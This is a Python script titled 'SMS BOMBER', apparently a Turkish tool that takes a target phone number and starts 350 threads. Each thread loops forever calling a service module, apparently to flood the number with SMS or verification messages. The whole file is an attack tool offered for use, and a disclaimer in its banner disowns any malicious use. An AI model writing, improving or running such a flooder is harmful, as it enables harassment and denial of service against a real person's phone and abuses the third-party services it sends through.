import sys, os, pyfiglet
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()

def start(phone):
	attack_number_phone.phone(phone)

	while True:
	    try:
	        attack_number_phone.random_service()
	    except Exception as ex:
	    	print(ex)

os.system('cls')

print(Fore.CYAN + ("""
  /$$$$$$  /$$      /$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$      /$$ /$$$$$$$  /$$$$$$$$ /$$$$$$$
 /$$__  $$| $$$    /$$$ /$$__  $$      | $$__  $$ /$$__  $$| $$$    /$$$| $$__  $$| $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \__/      | $$  \ $$| $$  \ $$| $$$$  /$$$$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$ | $$ $$/$$ $$|  $$$$$$       | $$$$$$$ | $$  | $$| $$ $$/$$ $$| $$$$$$$ | $$$$$   | $$$$$$$/
 \____  $$| $$  $$$| $$ \____  $$      | $$__  $$| $$  | $$| $$  $$$| $$| $$__  $$| $$__/   | $$__  $$
 /$$  \ $$| $$\  $ | $$ /$$  \ $$      | $$  \ $$| $$  | $$| $$\  $ | $$| $$  \ $$| $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$|  $$$$$$/      | $$$$$$$/|  $$$$$$/| $$ \/  | $$| $$$$$$$/| $$$$$$$$| $$  | $$
 \______/ |__/     |__/ \______/       |_______/  \______/ |__/     |__/|_______/ |________/|__/  |__/

    By : Kharoxe#0083
    Site : kharoxe.xyz
    Not : Herhangi Bir Kötü Amaçlı Kullanıma Dair Sorumlu Değilimdir.
"""))

print(Fore.RED + '============')
phone = input('Numara : ')
print(Fore.RED + '============')

try:
	attack_number_phone.phone(phone)
except:
	print(Fore.RED + 'Geçersiz giriş biçimi +905xxxxxxxxx olarak tekrar deneyin.')
	sys.exit()



for i in range(350):
	th = Thread(target=start, args=(phone,))
	th.start()
